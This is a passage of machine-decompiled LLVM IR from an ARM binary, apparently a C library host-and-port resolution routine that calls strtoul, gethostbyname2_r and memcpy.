  %v2_26c74 = inttoptr i32 %v1_26c74 to i32*
  %v3_26c74 = load i32, i32* %v2_26c74, align 4
  store i32 %v3_26c74, i32* %r3.global-to-local, align 4
  %v2_26c78 = icmp eq i32 %v3_26c74, 0
  br i1 %v2_26c78, label %dec_label_pc_26c80, label %dec_label_pc_26ca8

dec_label_pc_26c80:                               ; preds = %dec_label_pc_26c64, %dec_label_pc_26c54, %dec_label_pc_26c48
  %v0_26c80 = load i32, i32* @r5, align 4
  %v1_26c80 = add i32 %v0_26c80, 1
  store i32 %v1_26c80, i32* @r0, align 4
  %v2_26c84 = ptrtoint i8** %stack_var_-60 to i32
  store i32 %v2_26c84, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v3_26c8c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_26c8c, i32* @r4, align 4
  %v3_26c90 = call i32 @strtoul(i32 %v1_26c80, i32 %v2_26c84, i32 10)
  store i32 %v3_26c90, i32* %r0.global-to-local, align 4
  %v3_26c94 = load i8*, i8** %stack_var_-60, align 4
  %v4_26c94 = ptrtoint i8* %v3_26c94 to i32
  store i32 %v4_26c94, i32* %r3.global-to-local, align 4
  %v1_26c98 = load i32, i32* @r4, align 4
  %v2_26c98 = add i32 %v1_26c98, 24
  %v3_26c98 = inttoptr i32 %v2_26c98 to i32*
  store i32 %v3_26c90, i32* %v3_26c98, align 4
  %v0_26c9c = load i32, i32* %r3.global-to-local, align 4
  %v1_26c9c = inttoptr i32 %v0_26c9c to i8*
  %v2_26c9c = load i8, i8* %v1_26c9c, align 1
  %v3_26c9c = zext i8 %v2_26c9c to i32
  store i32 %v3_26c9c, i32* %r3.global-to-local, align 4
  %v2_26ca0 = icmp eq i8 %v2_26c9c, 0
  br i1 %v2_26ca0, label %dec_label_pc_26ca8, label %dec_label_pc_27300

dec_label_pc_26ca8:                               ; preds = %dec_label_pc_26c80, %dec_label_pc_26c64, %dec_label_pc_26ba8, %dec_label_pc_26c1c, %bb285
  %v3_26ca8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_26ca8, i32* %r3.global-to-local, align 4
  %v1_26cac = add i32 %v3_26ca8, 4
  %v2_26cac = inttoptr i32 %v1_26cac to i32*
  %v3_26cac = load i32, i32* %v2_26cac, align 4
  store i32 %v3_26cac, i32* %r3.global-to-local, align 4
  %v2_26cb0 = icmp eq i32 %v3_26cac, 0
  br i1 %v2_26cb0, label %dec_label_pc_26cb8, label %dec_label_pc_26fa0

dec_label_pc_26cb8:                               ; preds = %dec_label_pc_26ca8
  %v0_26cb8 = load i32, i32* @r8, align 4
  %v1_26cb8 = inttoptr i32 %v0_26cb8 to i32*
  %v2_26cb8 = load i32, i32* %v1_26cb8, align 4
  store i32 %v2_26cb8, i32* %r3.global-to-local, align 4
  %v1_26cbc = and i32 %v2_26cb8, 4
  %v2_26cbc = icmp eq i32 %v1_26cbc, 0
  br i1 %v2_26cbc, label %dec_label_pc_26cc4, label %dec_label_pc_26fa0

dec_label_pc_26cc4:                               ; preds = %dec_label_pc_26cb8
  %v1_26cc4 = add i32 %v0_26cb8, 4
  %v2_26cc4 = inttoptr i32 %v1_26cc4 to i32*
  %v3_26cc4 = load i32, i32* %v2_26cc4, align 4
  store i32 %v3_26cc4, i32* %r3.global-to-local, align 4
  %v7_26cc8 = icmp eq i32 %v3_26cc4, 10
  br i1 %v7_26cc8, label %dec_label_pc_26ce4, label %bb288

bb288:                                            ; preds = %dec_label_pc_26cc4
  %v3_26ccc = icmp eq i32 %v3_26cc4, 0
  br i1 %v3_26ccc, label %dec_label_pc_26ce4, label %.thread39

.thread39:                                        ; preds = %bb288
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v3_26cdc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v3_26cdc, i32* %r1.global-to-local, align 4
  br label %bb293

dec_label_pc_26ce4:                               ; preds = %bb288, %dec_label_pc_26cc4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_26ce8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_26ce8, i32* @sl, align 4
  %v2_26cec = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_26cec, i32* @r6, align 4
  %v2_26cf0 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_26cf0, i32* @r5, align 4
  br label %dec_label_pc_26cf4

dec_label_pc_26cf4:                               ; preds = %dec_label_pc_26d28.dec_label_pc_26cf4_crit_edge, %dec_label_pc_26ce4
  %v0_26cf4 = phi i32 [ %v0_26cf4.pre, %dec_label_pc_26d28.dec_label_pc_26cf4_crit_edge ], [ 512, %dec_label_pc_26ce4 ]
  %v2_26cf4 = mul i32 %v0_26cf4, 2
  store i32 %v2_26cf4, i32* @r4, align 4
  %v1_26cf8 = add i32 %v2_26cf4, 14
  %v1_26cfc = and i32 %v1_26cf8, -8
  %v1_26d00 = load i32, i32* @sp, align 4
  %v2_26d00 = sub i32 %v1_26d00, %v1_26cfc
  %v0_26d04 = load i32, i32* @r7, align 4
  store i32 %v0_26d04, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v2_26ce8, i32* %r2.global-to-local, align 4
  %v1_26d10 = add i32 %v2_26d00, 16
  store i32 %v1_26d10, i32* %r3.global-to-local, align 4
  %v1_26d14 = inttoptr i32 %v2_26d00 to i32*
  store i32 %v2_26cf4, i32* %v1_26d14, align 4
  %v3_26d14 = add i32 %v2_26d00, 4
  %v4_26d14 = inttoptr i32 %v3_26d14 to i32*
  store i32 %v2_26cec, i32* %v4_26d14, align 4
  %v1_26d18 = load i32, i32* @sp, align 4
  %v2_26d18 = add i32 %v1_26d18, 8
  %v3_26d18 = inttoptr i32 %v2_26d18 to i32*
  store i32 %v2_26cf0, i32* %v3_26d18, align 4
  %v6_26d1c = call i32 @gethostbyname2_r(i32 %v0_26d04, i32 10, i32* nonnull %stack_var_-104, i32 %v1_26d10)
  store i32 %v6_26d1c, i32* %r0.global-to-local, align 4
  %v7_26d20 = icmp eq i32 %v6_26d1c, 34
  br i1 %v7_26d20, label %dec_label_pc_26d28, label %dec_label_pc_26d38

dec_label_pc_26d28:                               ; preds = %dec_label_pc_26cf4
  %v3_26d28 = load i32, i32* %stack_var_-68, align 4
  store i32 %v3_26d28, i32* %r3.global-to-local, align 4
  %v7_26d2c = icmp eq i32 %v3_26d28, -1
  br i1 %v7_26d2c, label %dec_label_pc_26d28.dec_label_pc_26cf4_crit_edge, label %dec_label_pc_26d40

dec_label_pc_26d28.dec_label_pc_26cf4_crit_edge:  ; preds = %dec_label_pc_26d28
  %v0_26cf4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_26cf4

dec_label_pc_26d38:                               ; preds = %dec_label_pc_26cf4
  %v2_26d38 = icmp eq i32 %v6_26d1c, 0
  br i1 %v2_26d38, label %dec_label_pc_26d74, label %dec_label_pc_26d38.dec_label_pc_26d40_crit_edge

dec_label_pc_26d38.dec_label_pc_26d40_crit_edge:  ; preds = %dec_label_pc_26d38
  %v3_26d40.pre = load i32, i32* %stack_var_-68, align 4
  br label %dec_label_pc_26d40

dec_label_pc_26d40:                               ; preds = %dec_label_pc_26d28, %dec_label_pc_26d38.dec_label_pc_26d40_crit_edge
  %v0_26d60 = phi i32 [ %v3_26d40.pre, %dec_label_pc_26d38.dec_label_pc_26d40_crit_edge ], [ %v3_26d28, %dec_label_pc_26d28 ]
  store i32 %v0_26d60, i32* @r0, align 4
  %v7_26d44 = icmp eq i32 %v0_26d60, -1
  br i1 %v7_26d44, label %dec_label_pc_27124, label %dec_label_pc_26d4c

dec_label_pc_26d4c:                               ; preds = %dec_label_pc_26d40
  %v7_26d4c = icmp eq i32 %v0_26d60, 2
  %v2_26d50 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_26d50, i32* %r1.global-to-local, align 4
  br i1 %v7_26d4c, label %bb290, label %dec_label_pc_26d60

bb290:                                            ; preds = %dec_label_pc_26d4c
  %tmp291 = bitcast i32* %stack_var_-56 to i8*
  store i32 -3, i32* @r5, align 4
  br label %dec_label_pc_26e18

dec_label_pc_26d60:                               ; preds = %dec_label_pc_26d4c
  %v7_26d60 = icmp eq i32 %v0_26d60, 4
  br i1 %v7_26d60, label %.thread42, label %bb292

bb292:                                            ; preds = %dec_label_pc_26d60
  store i32 0, i32* @r5, align 4
  br label %bb293

.thread42:                                        ; preds = %dec_label_pc_26d60
  store i32 1, i32* @r5, align 4
  br label %bb293

bb293:                                            ; preds = %bb292, %.thread39, %.thread42
  %v0_26d6c = phi i32 [ %v3_26cdc, %.thread39 ], [ %v2_26d50, %bb292 ], [ %v2_26d50, %.thread42 ]
  %v0_26e3c330 = phi i32 [ 0, %.thread39 ], [ 0, %bb292 ], [ 1, %.thread42 ]
  %v5_26d6c = inttoptr i32 %v0_26d6c to i8*
  br label %dec_label_pc_26e18

dec_label_pc_26d74:                               ; preds = %dec_label_pc_26d38
  %v3_26d74 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_26d74, i32* %r3.global-to-local, align 4
  %v2_26d78 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_26d78, i32* %r1.global-to-local, align 4
  %v2_26d7c = icmp eq i32 %v3_26d74, 0
  %tmp294 = bitcast i32* %stack_var_-56 to i8*
  br i1 %v2_26d7c, label %bb295, label %dec_label_pc_26d8c

bb295:                                            ; preds = %dec_label_pc_26d74
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_26e18

dec_label_pc_26d8c:                               ; preds = %dec_label_pc_26d74
  store i32 0, i32* @r6, align 4
  store i32 10, i32* @r5, align 4
  br label %dec_label_pc_26df4

dec_label_pc_26da0:                               ; preds = %dec_label_pc_26df4
  %v4_26da0 = ptrtoint i8* %storemerge to i32
  store i32 %v4_26da0, i32* %r3.global-to-local, align 4
  %v1_26da4 = bitcast i8* %storemerge to i32*
  %v2_26da4 = load i32, i32* %v1_26da4, align 4
  store i32 %v2_26da4, i32* %r1.global-to-local, align 4
  %v2_26da8 = icmp eq i32 %v2_26da4, 0
  br i1 %v2_26da8, label %bb297, label %bb296

bb296:                                            ; preds = %dec_label_pc_26da0
  store i32 %v3_26db847, i32* %r0.global-to-local, align 4
  br label %.thread48

bb297:                                            ; preds = %dec_label_pc_26da0
  %v1_26dac = load i32, i32* @sp, align 4
  %v2_26db0 = add i32 %v1_26dac, -24
  store i32 %v2_26db0, i32* %r3.global-to-local, align 4
  %v4_26db4 = inttoptr i32 %v1_26dac to i32*
  store i32 0, i32* %v4_26db4, align 4
  %v3_26db8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_26db8, i32* %r0.global-to-local, align 4
  store i32 %v4_26da0, i32* %r1.global-to-local, align 4
  %v1_26dc0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_26dc0, i32* %v1_26da4, align 4
  %v0_26dc4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread48

.thread48:                                        ; preds = %bb296, %bb297
  %v0_26dc4 = phi i32 [ %v3_26db847, %bb296 ], [ %v0_26dc4.pre, %bb297 ]
  %v1_26dc4 = add i32 %v0_26dc4, 16
  %v2_26dc4 = inttoptr i32 %v1_26dc4 to i32*
  %v3_26dc4 = load i32, i32* %v2_26dc4, align 4
  store i32 %v3_26dc4, i32* @r3, align 4
  store i32 %v4_26da0, i32* %r0.global-to-local, align 4
  %v2_26dcc = load i32, i32* %v1_26da4, align 4
  store i32 %v2_26dcc, i32* %r1.global-to-local, align 4
  %v0_26dd0 = load i32, i32* @r6, align 4
  %v2_26dd0 = inttoptr i32 %v2_26dcc to i32*
  store i32 %v0_26dd0, i32* %v2_26dd0, align 4
  %v0_26dd4 = load i32, i32* %r0.global-to-local, align 4
  %v1_26dd4 = inttoptr i32 %v0_26dd4 to i32*
  %v2_26dd4 = load i32, i32* %v1_26dd4, align 4
  store i32 %v2_26dd4, i32* %r0.global-to-local, align 4
  %v0_26dd8 = load i32, i32* @r3, align 4
  %v1_26dd8 = load i32, i32* @ip, align 4
  %v2_26dd8 = add i32 %v1_26dd8, %v0_26dd8
  %v3_26dd8 = inttoptr i32 %v2_26dd8 to i32*
  %v4_26dd8 = load i32, i32* %v3_26dd8, align 4
  store i32 %v4_26dd8, i32* @r1, align 4
  %v0_26ddc = load i32, i32* @r5, align 4
  %v2_26ddc = add i32 %v2_26dd4, 4
  %v3_26ddc = inttoptr i32 %v2_26ddc to i32*
  store i32 %v0_26ddc, i32* %v3_26ddc, align 4
  %v0_26de0 = load i32, i32* %r0.global-to-local, align 4
  %v1_26de0 = add i32 %v0_26de0, 8
  store i32 %v1_26de0, i32* @r0, align 4
  %v0_26de4 = call i32 @memcpy()
  store i32 %v0_26de4, i32* %r0.global-to-local, align 4
  store i32 %v4_26da0, i32* %r2.global-to-local, align 4
  %v2_26dec = load i32, i32* %v1_26da4, align 4
  store i32 %v2_26dec, i32* %r2.global-to-local, align 4
  %v5_26df0 = inttoptr i32 %v2_26dec to i8*
  %v3_26df4.pre = load i32, i32* %stack_var_-64, align 4
  %v0_26dfc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_26df4

dec_label_pc_26df4:                               ; preds = %dec_label_pc_26d8c, %.thread48
  %v0_26e0c = phi i32 [ %v0_26dfc.pre, %.thread48 ], [ 0, %dec_label_pc_26d8c ]
  %v3_26db847 = phi i32 [ %v3_26df4.pre, %.thread48 ], [ %v3_26d74, %dec_label_pc_26d8c ]
  %storemerge = phi i8* [ %v5_26df0, %.thread48 ], [ %tmp294, %dec_label_pc_26d8c ]
  store i32 %v3_26db847, i32* %r3.global-to-local, align 4
  %v1_26df8 = add i32 %v3_26db847, 16
  %v2_26df8 = inttoptr i32 %v1_26df8 to i32*
  %v3_26df8 = load i32, i32* %v2_26df8, align 4
  store i32 %v3_26df8, i32* %r3.global-to-local, align 4
  %v3_26dfc = mul i32 %v0_26e0c, 4
  store i32 %v3_26dfc, i32* @ip, align 4
  %v2_26e00 = add i32 %v3_26df8, %v3_26dfc
  %v3_26e00 = inttoptr i32 %v2_26e00 to i32*
  %v4_26e00 = load i32, i32* %v3_26e00, align 4
  store i32 %v4_26e00, i32* %r0.global-to-local, align 4
  %v2_26e04 = icmp eq i32 %v4_26e00, 0
  store i32 16, i32* @r2, align 4
  %v1_26e0c = add i32 %v0_26e0c, 1
  store i32 %v1_26e0c, i32* @r4, align 4
  br i1 %v2_26e04, label %dec_label_pc_26e14, label %dec_label_pc_26da0

dec_label_pc_26e14:                               ; preds = %dec_label_pc_26df4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_26e18

dec_label_pc_26e18:                               ; preds = %bb295, %bb290, %bb293, %dec_label_pc_26e14
  %v0_26f70.pre = phi i32 [ -3, %bb290 ], [ %v0_26e3c330, %bb293 ], [ 0, %bb295 ], [ 0, %dec_label_pc_26e14 ]
  %stack_var_-164.2 = phi i8* [ %tmp291, %bb290 ], [ %v5_26d6c, %bb293 ], [ %tmp294, %bb295 ], [ %storemerge, %dec_label_pc_26e14 ]
  %v0_26e18 = load i32, i32* @r8, align 4
  %v1_26e18 = add i32 %v0_26e18, 4
  %v2_26e18 = inttoptr i32 %v1_26e18 to i32*
  %v3_26e18 = load i32, i32* %v2_26e18, align 4
  store i32 %v3_26e18, i32* %r3.global-to-local, align 4
  %v7_26e1c = icmp eq i32 %v3_26e18, 2
  br i1 %v7_26e1c, label %dec_label_pc_26e44, label %dec_label_pc_26e24

dec_label_pc_26e24:                               ; preds = %dec_label_pc_26e18
  store i32 %v0_268c8, i32* %ip.global-to-local, align 4
  %v2_26e28 = icmp eq i32 %v0_268c8, 0
  br i1 %v2_26e28, label %dec_label_pc_26e30, label %dec_label_pc_26e3c

dec_label_pc_26e30:                               ; preds = %dec_label_pc_26e24
  %v2_26e30 = icmp eq i32 %v3_26e18, 0
  br i1 %v2_26e30, label %dec_label_pc_26e44, label %dec_label_pc_26f7c

dec_label_pc_26e3c:                               ; preds = %dec_label_pc_26e24
  %v2_26e3c = icmp eq i32 %v0_26f70.pre, 0
  br i1 %v2_26e3c, label %dec_label_pc_26e58, label %dec_label_pc_26e44

dec_label_pc_26e44:                               ; preds = %dec_label_pc_26e58, %dec_label_pc_26e3c, %dec_label_pc_26e30, %dec_label_pc_26e18
  %v2_26e48 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_26e48, i32* @sb, align 4
  %v2_26e4c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_26e4c, i32* @sl, align 4
  %v2_26e50 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_26e50, i32* @r6, align 4
  br label %dec_label_pc_26e68

dec_label_pc_26e58:                               ; preds = %dec_label_pc_26e3c
  %v1_26e58 = inttoptr i32 %v0_26e18 to i32*
  %v2_26e58 = load i32, i32* %v1_26e58, align 4
  store i32 %v2_26e58, i32* %r3.global-to-local, align 4
  %v1_26e5c = and i32 %v2_26e58, 16
  %v2_26e5c = icmp eq i32 %v1_26e5c, 0
  br i1 %v2_26e5c, label %dec_label_pc_26f7c, label %dec_label_pc_26e44

dec_label_pc_26e68:                               ; preds = %dec_label_pc_26e9c.dec_label_pc_26e68_crit_edge, %dec_label_pc_26e44
  %v0_26e68 = phi i32 [ %v0_26e68.pre, %dec_label_pc_26e9c.dec_label_pc_26e68_crit_edge ], [ 512, %dec_label_pc_26e44 ]
  %v2_26e68 = mul i32 %v0_26e68, 2
  store i32 %v2_26e68, i32* @r4, align 4
  %v1_26e6c = add i32 %v2_26e68, 14
  %v1_26e70 = and i32 %v1_26e6c, -8
  %v1_26e74 = load i32, i32* @sp, align 4
  %v2_26e74 = sub i32 %v1_26e74, %v1_26e70
  %v0_26e78 = load i32, i32* @r7, align 4
  store i32 %v0_26e78, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v2_26e48, i32* %r2.global-to-local, align 4
  %v1_26e84 = add i32 %v2_26e74, 16
  store i32 %v1_26e84, i32* %r3.global-to-local, align 4
  %v1_26e88 = inttoptr i32 %v2_26e74 to i32*
  store i32 %v2_26e68, i32* %v1_26e88, align 4
  %v3_26e88 = add i32 %v2_26e74, 4
  %v4_26e88 = inttoptr i32 %v3_26e88 to i32*
  store i32 %v2_26e4c, i32* %v4_26e88, align 4
  %v1_26e8c = load i32, i32* @sp, align 4
  %v2_26e8c = add i32 %v1_26e8c, 8
  %v3_26e8c = inttoptr i32 %v2_26e8c to i32*
  store i32 %v2_26e50, i32* %v3_26e8c, align 4
  %v6_26e90 = call i32 @gethostbyname2_r(i32 %v0_26e78, i32 2, i32* nonnull %stack_var_-104, i32 %v1_26e84)
  store i32 %v6_26e90, i32* %r0.global-to-local, align 4
  %v7_26e94 = icmp eq i32 %v6_26e90, 34
  br i1 %v7_26e94, label %dec_label_pc_26e9c, label %dec_label_pc_26eac

dec_label_pc_26e9c:                               ; preds = %dec_label_pc_26e68
  %v3_26e9c = load i32, i32* %stack_var_-68, align 4
  store i32 %v3_26e9c, i32* %r3.global-to-local, align 4
  %v7_26ea0 = icmp eq i32 %v3_26e9c, -1
  br i1 %v7_26ea0, label %dec_label_pc_26e9c.dec_label_pc_26e68_crit_edge, label %dec_label_pc_26eb4

dec_label_pc_26e9c.dec_label_pc_26e68_crit_edge:  ; preds = %dec_label_pc_26e9c
  %v0_26e68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_26e68

dec_label_pc_26eac:                               ; preds = %dec_label_pc_26e68
  %v2_26eac = icmp eq i32 %v6_26e90, 0
  br i1 %v2_26eac, label %dec_label_pc_26edc, label %dec_label_pc_26eac.dec_label_pc_26eb4_crit_edge

dec_label_pc_26eac.dec_label_pc_26eb4_crit_edge:  ; preds = %dec_label_pc_26eac
  %v3_26eb4.pre = load i32, i32* %stack_var_-68, align 4
  br label %dec_label_pc_26eb4

dec_label_pc_26eb4:                               ; preds = %dec_label_pc_26e9c, %dec_label_pc_26eac.dec_label_pc_26eb4_crit_edge
  %v0_26ecc.pr = phi i32 [ %v3_26eb4.pre, %dec_label_pc_26eac.dec_label_pc_26eb4_crit_edge ], [ %v3_26e9c, %dec_label_pc_26e9c ]
  store i32 %v0_26ecc.pr, i32* @r0, align 4
  %v7_26eb8 = icmp eq i32 %v0_26ecc.pr, -1
  br i1 %v7_26eb8, label %dec_label_pc_27124, label %dec_label_pc_26ec0

dec_label_pc_26ec0:                               ; preds = %dec_label_pc_26eb4
  %v7_26ec0 = icmp eq i32 %v0_26ecc.pr, 2
  br i1 %v7_26ec0, label %bb302, label %dec_label_pc_26ecc

dec_label_pc_26ecc:                               ; preds = %dec_label_pc_26ec0
  %v7_26ecc = icmp eq i32 %v0_26ecc.pr, 4
  br i1 %v7_26ecc, label %bb302, label %dec_label_pc_26f7c.thread

dec_label_pc_26edc:                               ; preds = %dec_label_pc_26eac
  %v3_26edc = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_26edc, i32* %r3.global-to-local, align 4
  %v2_26ee0 = icmp eq i32 %v3_26edc, 0
  br i1 %v2_26ee0, label %dec_label_pc_26f7c.thread, label %dec_label_pc_26f4c.preheader

dec_label_pc_26f4c.preheader:                     ; preds = %dec_label_pc_26edc
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 2, i32* @r6, align 4
  br label %dec_label_pc_26f4c

dec_label_pc_26ef8:                               ; preds = %dec_label_pc_26f4c
  %v4_26ef8 = ptrtoint i8* %stack_var_-164.3 to i32
  store i32 %v4_26ef8, i32* %r3.global-to-local, align 4
  %v1_26efc = bitcast i8* %stack_var_-164.3 to i32*
  %v2_26efc = load i32, i32* %v1_26efc, align 4
  store i32 %v2_26efc, i32* %r1.global-to-local, align 4
  %v2_26f00 = icmp eq i32 %v2_26efc, 0
  br i1 %v2_26f00, label %bb301, label %bb300

bb300:                                            ; preds = %dec_label_pc_26ef8
  store i32 %v3_26f1057, i32* %r0.global-to-local, align 4
  br label %.thread58

bb301:                                            ; preds = %dec_label_pc_26ef8
  %v1_26f04 = load i32, i32* @sp, align 4
  %v2_26f08 = add i32 %v1_26f04, -24
  store i32 %v2_26f08, i32* %r3.global-to-local, align 4
  %v4_26f0c = inttoptr i32 %v1_26f04 to i32*
  store i32 0, i32* %v4_26f0c, align 4
  %v3_26f10 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_26f10, i32* %r0.global-to-local, align 4
  store i32 %v4_26ef8, i32* %r1.global-to-local, align 4
  %v1_26f18 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_26f18, i32* %v1_26efc, align 4
  %v0_26f1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread58

.thread58:                                        ; preds = %bb300, %bb301
  %v0_26f1c = phi i32 [ %v3_26f1057, %bb300 ], [ %v0_26f1c.pre, %bb301 ]
  %v1_26f1c = add i32 %v0_26f1c, 16
  %v2_26f1c = inttoptr i32 %v1_26f1c to i32*
  %v3_26f1c = load i32, i32* %v2_26f1c, align 4
  store i32 %v3_26f1c, i32* @r3, align 4
  store i32 %v4_26ef8, i32* %r0.global-to-local, align 4
  %v2_26f24 = load i32, i32* %v1_26efc, align 4
  store i32 %v2_26f24, i32* %r1.global-to-local, align 4
  %v0_26f28 = load i32, i32* %r7.global-to-local, align 4
  %v2_26f28 = inttoptr i32 %v2_26f24 to i32*
  store i32 %v0_26f28, i32* %v2_26f28, align 4
  %v0_26f2c = load i32, i32* %r0.global-to-local, align 4
  %v1_26f2c = inttoptr i32 %v0_26f2c to i32*
  %v2_26f2c = load i32, i32* %v1_26f2c, align 4
  store i32 %v2_26f2c, i32* %r0.global-to-local, align 4
  %v0_26f30 = load i32, i32* @r3, align 4
  %v1_26f30 = load i32, i32* @ip, align 4
  %v2_26f30 = add i32 %v1_26f30, %v0_26f30
  %v3_26f30 = inttoptr i32 %v2_26f30 to i32*
  %v4_26f30 = load i32, i32* %v3_26f30, align 4
  store i32 %v4_26f30, i32* @r1, align 4
  %v0_26f34 = load i32, i32* @r6, align 4
  %v2_26f34 = add i32 %v2_26f2c, 4
  %v3_26f34 = inttoptr i32 %v2_26f34 to i32*
  store i32 %v0_26f34, i32* %v3_26f34, align 4
  %v0_26f38 = load i32, i32* %r0.global-to-local, align 4
  %v1_26f38 = add i32 %v0_26f38, 8
  store i32 %v1_26f38, i32* @r0, align 4
  %v0_26f3c = call i32 @memcpy()
  store i32 %v0_26f3c, i32* %r0.global-to-local, align 4
  store i32 %v4_26ef8, i32* %r2.global-to-local, align 4
  %v2_26f44 = load i32, i32* %v1_26efc, align 4
  store i32 %v2_26f44, i32* %r2.global-to-local, align 4
  %v5_26f48 = inttoptr i32 %v2_26f44 to i8*
  %v3_26f4c.pre = load i32, i32* %stack_var_-64, align 4
  %v0_26f54.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_26f4c

dec_label_pc_26f4c:                               ; preds = %dec_label_pc_26f4c.preheader, %.thread58
  %v0_26f64 = phi i32 [ %v0_26f54.pre, %.thread58 ], [ 0, %dec_label_pc_26f4c.preheader ]
  %v3_26f1057 = phi i32 [ %v3_26f4c.pre, %.thread58 ], [ %v3_26edc, %dec_label_pc_26f4c.preheader ]
  %stack_var_-164.3 = phi i8* [ %v5_26f48, %.thread58 ], [ %stack_var_-164.2, %dec_label_pc_26f4c.preheader ]
  store i32 %v3_26f1057, i32* %r3.global-to-local, align 4
  %v1_26f50 = add i32 %v3_26f1057, 16
  %v2_26f50 = inttoptr i32 %v1_26f50 to i32*
  %v3_26f50 = load i32, i32* %v2_26f50, align 4
  store i32 %v3_26f50, i32* %r3.global-to-local, align 4
  %v3_26f54 = mul i32 %v0_26f64, 4
  store i32 %v3_26f54, i32* @ip, align 4
  %v2_26f58 = add i32 %v3_26f50, %v3_26f54
  %v3_26f58 = inttoptr i32 %v2_26f58 to i32*
  %v4_26f58 = load i32, i32* %v3_26f58, align 4
  store i32 %v4_26f58, i32* %r3.global-to-local, align 4
  %v2_26f5c = icmp eq i32 %v4_26f58, 0
  store i32 4, i32* @r2, align 4
  %v1_26f64 = add i32 %v0_26f64, 1
  store i32 %v1_26f64, i32* @r4, align 4
  br i1 %v2_26f5c, label %dec_label_pc_26f7c.thread, label %dec_label_pc_26ef8

dec_label_pc_26f7c.thread:                        ; preds = %dec_label_pc_26f4c, %dec_label_pc_26edc, %dec_label_pc_26ecc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26fa0

dec_label_pc_26f7c:                               ; preds = %dec_label_pc_26e30, %dec_label_pc_26e58
  %v0_26f70 = phi i32 [ 0, %dec_label_pc_26e58 ], [ %v0_26f70.pre, %dec_label_pc_26e30 ]
  store i32 %v0_26f70, i32* %r0.global-to-local, align 4
  %v2_26f7c = icmp eq i32 %v0_26f70, 0
  br i1 %v2_26f7c, label %dec_label_pc_26fa0, label %.thread207

.thread207:                                       ; preds = %dec_label_pc_26f7c
  br label %dec_label_pc_26f88

bb302:                                            ; preds = %dec_label_pc_26ecc, %dec_label_pc_26ec0
  %storemerge225 = phi i32 [ -3, %dec_label_pc_26ec0 ], [ 1, %dec_label_pc_26ecc ]
  store i32 %storemerge225, i32* %r0.global-to-local, align 4
  %v1_26f80.pre = load i32, i32* @r5, align 4
  %v3_26f80 = icmp eq i32 %v1_26f80.pre, 0
  br i1 %v3_26f80, label %dec_label_pc_26fa0, label %dec_label_pc_26f88

dec_label_pc_26f88:                               ; preds = %.thread207, %bb302
  %v0_26f8c211 = phi i32 [ %v0_26f70, %.thread207 ], [ %v1_26f80.pre, %bb302 ]
  %v1_26f90210 = phi i32 [ %v0_26f70, %.thread207 ], [ %storemerge225, %bb302 ]
  store i32 259, i32* %r3.global-to-local, align 4
  %v7_26f8c = icmp eq i32 %v0_26f8c211, -3
  br i1 %v7_26f8c, label %bb303, label %bb304

bb303:                                            ; preds = %dec_label_pc_26f88
  %v8_26f90 = icmp eq i32 %v1_26f90210, -3
  br i1 %v8_26f90, label %.thread67, label %.thread68

.thread68:                                        ; preds = %bb303
  store i32 259, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2730c

bb304:                                            ; preds = %dec_label_pc_26f88
  store i32 259, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2730c

.thread67:                                        ; preds = %bb303
  store i32 3, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2730c

dec_label_pc_26fa0:                               ; preds = %dec_label_pc_26f7c, %dec_label_pc_26f7c.thread, %dec_label_pc_26cb8, %dec_label_pc_26ca8, %bb302
  %v3_26fa0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_26fa0, i32* %r3.global-to-local, align 4
  %v1_26fa4 = add i32 %v3_26fa0, 4
  %v2_26fa4 = inttoptr i32 %v1_26fa4 to i32*
  %v3_26fa4 = load i32, i32* %v2_26fa4, align 4
  store i32 %v3_26fa4, i32* %r3.global-to-local, align 4
  %v2_26fa8 = icmp eq i32 %v3_26fa4, 0
  br i1 %v2_26fa8, label %dec_label_pc_27300, label %.thread75

dec_label_pc_26fb4:                               ; preds = %dec_label_pc_26b44
  store i32 %v2_26fb8, i32* @r4, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v2_26fb8, i32* @r0, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_26fb8, i32* %stack_var_-56, align 4
  %v0_26fcc = call i32 @__GI_memset()
  store i32 %v0_26fcc, i32* %r0.global-to-local, align 4
  %v0_26fd0 = load i32, i32* @r8, align 4
  %v1_26fd0 = add i32 %v0_26fd0, 4
  %v2_26fd0 = inttoptr i32 %v1_26fd0 to i32*
  %v3_26fd0 = load i32, i32* %v2_26fd0, align 4
  store i32 %v3_26fd0, i32* @r1, align 4
  %v2_26fd4 = icmp eq i32 %v3_26fd0, 0
